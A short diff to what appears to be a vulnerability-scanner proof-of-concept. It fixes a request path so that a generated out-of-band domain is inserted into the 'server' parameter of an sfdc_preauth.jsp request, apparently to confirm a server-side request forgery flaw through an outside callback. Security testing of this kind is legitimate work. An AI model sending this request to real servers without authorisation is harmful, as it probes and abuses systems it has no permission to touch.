@@ -39,7 +39,7 @@ def poc(url):
 
         oob_domain,flag = gen_oob_domain()
 
-        path = """/service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://oob_domain%23.salesforce.com/"""
+        path = """/service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://{oob_domain}%23.salesforce.com/""".format(oob_domain=oob_domain)
         method = "GET"
         data = """"""
         headers = {'Accept': '*/*'}
